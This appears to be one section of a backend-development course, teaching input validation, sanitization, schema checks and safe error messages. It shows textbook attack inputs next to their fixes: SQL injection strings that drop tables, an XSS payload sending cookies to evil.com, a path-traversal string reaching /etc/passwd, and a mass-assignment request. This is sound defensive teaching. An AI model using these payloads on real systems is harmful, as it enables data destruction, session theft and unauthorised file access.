# Section 5: Validation & Transformation

> "Never trust data that crosses a boundary. Not from users. Not from other services. Not from your own database."

---

## The Problem This Solves

Sarah is authenticated. We know it's her. But look at what she sent:

```json
{
  "size": "DROP TABLE orders;--",
  "quantity": -999,
  "email": "<script>alert('hacked')</script>",
  "discount_code": "ADMIN_100_PERCENT_OFF"
}
```

Authentication proves identity. Validation proves sanity.

Without validation:
- SQL injection destroys your database
- XSS attacks steal user sessions
- Business logic exploits drain your inventory
- Malformed data crashes your services

---

## First Principles

### Principle 1: All External Data is Hostile
User input, API responses, file uploads, webhook payloads - treat everything as an attack until proven safe.

### Principle 2: Validation Happens at Boundaries
```
┌──────────────────────────────────────────────────────┐
│                    YOUR SYSTEM                       │
│                                                      │
│   ╔═══════════════════════════════════════════════╗ │
│   ║            TRUSTED ZONE                       ║ │
│   ║  (Data has been validated)                    ║ │
│   ╚═══════════════════════════════════════════════╝ │
│         ▲           ▲           ▲                   │
│         │           │           │                   │
│    ┌────┴────┐ ┌────┴────┐ ┌────┴────┐             │
│    │VALIDATE │ │VALIDATE │ │VALIDATE │             │
│    └────┬────┘ └────┬────┘ └────┬────┘             │
│         │           │           │                   │
└─────────┼───────────┼───────────┼───────────────────┘
          │           │           │
     User Input   External API   File Upload
```

### Principle 3: Client Validation is for UX, Server Validation is for Security
Client-side validation can be bypassed with one curl command. Server-side validation is the real gate.

---

## Core Concepts

### 1. The Three Layers of Validation

```
┌─────────────────────────────────────────────────────────────┐
│  LAYER 1: SYNTACTIC VALIDATION                              │
│  "Is the format correct?"                                   │
│                                                             │
│  • email: valid email format?                               │
│  • age: is it a number?                                     │
│  • date: is it ISO 8601?                                    │
│  • JSON: does it parse?                                     │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│  LAYER 2: SEMANTIC VALIDATION                               │
│  "Does the value make sense?"                               │
│                                                             │
│  • age: between 0 and 150?                                  │
│  • quantity: positive number?                               │
│  • size: one of [S, M, L, XL]?                              │
│  • date: not in the past?                                   │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│  LAYER 3: BUSINESS VALIDATION                               │
│  "Is this allowed by business rules?"                       │
│                                                             │
│  • user: can they order from this region?                   │
│  • quantity: under max per customer limit?                  │
│  • coupon: still valid? user eligible?                      │
│  • product: in stock?                                       │
└─────────────────────────────────────────────────────────────┘
```

### 2. Common Attack Vectors

**SQL Injection:**
```
Input: "'; DROP TABLE users;--"

Vulnerable:
query = f"SELECT * FROM users WHERE name = '{input}'"
# Becomes: SELECT * FROM users WHERE name = ''; DROP TABLE users;--'

Safe:
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, [input])  # Parameterized query
```

**XSS (Cross-Site Scripting):**
```
Input: "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"

Vulnerable (rendering raw HTML):
<div>Welcome, {{ user_input }}</div>
# Script executes, steals cookies

Safe (escaping):
<div>Welcome, {{ user_input | escape }}</div>
# Renders as text: &lt;script&gt;...
```

**Mass Assignment:**
```json
// User submits profile update
{
  "name": "Sarah",
  "email": "sarah@example.com",
  "is_admin": true,  // Attacker added this!
  "balance": 999999  // And this!
}

// Vulnerable: accepts all fields
user.update(request.json)

// Safe: whitelist fields
user.update(request.json.only(['name', 'email']))
```

**Path Traversal:**
```
Input: "../../../etc/passwd"

Vulnerable:
file_path = f"/uploads/{filename}"
# Becomes: /uploads/../../../etc/passwd → /etc/passwd

Safe:
filename = os.path.basename(filename)  # Strip path components
# Or use allowlist of permitted files
```

### 3. Validation Strategies

**Schema Validation (Declarative):**
```python
# Define once, validate everywhere
from pydantic import BaseModel, validator

class OrderRequest(BaseModel):
    product_id: str
    quantity: int
    size: str

    @validator('quantity')
    def quantity_must_be_positive(cls, v):
        if v <= 0:
            raise ValueError('must be positive')
        return v

    @validator('size')
    def size_must_be_valid(cls, v):
        if v not in ['S', 'M', 'L', 'XL']:
            raise ValueError('invalid size')
        return v
```

**Validation Libraries by Language:**
| Language | Library |
|----------|---------|
| Python | Pydantic, Marshmallow, Cerberus |
| JavaScript | Joi, Yup, Zod |
| Go | go-playground/validator |
| Java | Hibernate Validator (JSR 380) |
| Ruby | dry-validation |

### 4. Sanitization vs Validation

**Validation:** Accept or reject
```python
if not is_valid_email(email):
    raise ValidationError("Invalid email")
```

**Sanitization:** Clean and transform
```python
# Remove dangerous characters
username = sanitize_html(username)

# Normalize format
phone = normalize_phone_number(phone)  # "+1 (555) 123-4567" → "+15551234567"

# Trim whitespace
email = email.strip().lower()
```

**When to use which:**
- **Validate** when bad data should be rejected (SQL injection attempts)
- **Sanitize** when data can be cleaned safely (extra whitespace)

### 5. Error Messages - Security vs Usability

**Too Helpful (Security Risk):**
```json
{
  "error": "User 'admin@company.com' not found in database 'prod_users'"
}
// Leaks: valid email format, database name, table structure
```

**Too Vague (UX Problem):**
```json
{
  "error": "Invalid request"
}
// User has no idea what to fix
```

**Just Right:**
```json
{
  "error": "Validation failed",
  "details": [
    {"field": "email", "message": "Invalid email format"},
    {"field": "quantity", "message": "Must be between 1 and 10"}
  ]
}
// Helpful without leaking internals
```

---

## The Validation Pipeline

```
Raw Input
    │
    ▼
┌───────────────────┐
│   Parse/Decode    │ ← "Is it valid JSON/XML/etc?"
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│  Type Coercion    │ ← "Convert '123' to integer 123"
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│   Sanitization    │ ← "Trim whitespace, normalize"
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│ Schema Validation │ ← "Required fields? Correct types?"
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│ Business Rules    │ ← "User allowed? Stock available?"
└─────────┬─────────┘
          │
          ▼
    Clean Data ✓
```

---

## Connections to Other Sections

| Connected To | How |
|--------------|-----|
| **Section 3 (Serialization)** | Deserialized data needs validation |
| **Section 4 (Auth)** | Auth tokens themselves need validation |
| **Section 6 (Middleware)** | Validation often runs as middleware |
| **Section 7 (Controllers)** | Business validation happens in services |
| **Section 8 (Database)** | Validated data goes to storage |
| **Section 14 (Observability)** | Validation failures need monitoring |

---

## Real-World Scenarios

### Scenario 1: The Negative Price Exploit
**What happened:** User submitted `quantity: -5` for a $100 product. Total: -$500. Refund processed automatically.
**Root Cause:** No semantic validation on quantity.
**Fix:** `quantity > 0` check before processing.

### Scenario 2: The Unicode Bypass
**What happened:** Username validation blocked "admin". Attacker used "аdmin" (Cyrillic 'а').
**Root Cause:** String comparison without normalization.
**Fix:** Unicode normalization before validation.

### Scenario 3: The File Upload Disaster
**What happened:** User uploaded "invoice.pdf.exe". Server stored it. Another user downloaded and executed.
**Root Cause:** Validated extension by checking if ".pdf" was in filename.
**Fix:** Check actual file magic bytes, not just extension.

---

## Validation Checklist

### Input Validation
- [ ] All user inputs validated server-side
- [ ] Parameterized queries (no string concatenation for SQL)
- [ ] HTML output escaped
- [ ] File uploads validated by content, not extension
- [ ] JSON/XML size limits enforced

### Business Validation
- [ ] Quantities positive and within limits
- [ ] Prices not manipulatable by users
- [ ] Permissions checked before actions
- [ ] Rate limits on sensitive operations

### Error Handling
- [ ] Validation errors return helpful messages
- [ ] Internal errors don't leak system details
- [ ] Failed validations logged for monitoring

---

## What You'll Build Understanding Of

After this section, you can:
- [ ] Design comprehensive validation schemas
- [ ] Prevent common injection attacks
- [ ] Implement proper sanitization
- [ ] Balance security and usability in error messages
- [ ] Build defense in depth

---

## Seniority Challenges

### Junior Level
"What's the difference between client-side and server-side validation? Why do we need both?"

### Mid Level
"Design a validation system for a file upload feature that accepts images (JPEG, PNG) up to 5MB. Consider: file type spoofing, size limits, content validation, and error handling."

### Senior Level
"Our API accepts webhooks from 10 different payment providers. Each has different payload formats, signatures, and retry behaviors. Design a validation and processing pipeline that's secure, maintainable, and observable."

---

## Key Takeaways

1. **Trust nothing** - All external data is hostile
2. **Validate at boundaries** - Every entry point needs checks
3. **Defense in depth** - Multiple layers of validation
4. **Fail safely** - Invalid data should be rejected, not fixed
5. **Log failures** - Validation errors are security signals

---

## Prerequisites
- Section 3: Serialization (data parsing)
- Section 4: Authentication (understanding trust boundaries)

## Next Section
→ [Section 6: Middleware](./06-middleware.md) - How do we orchestrate all these validations?
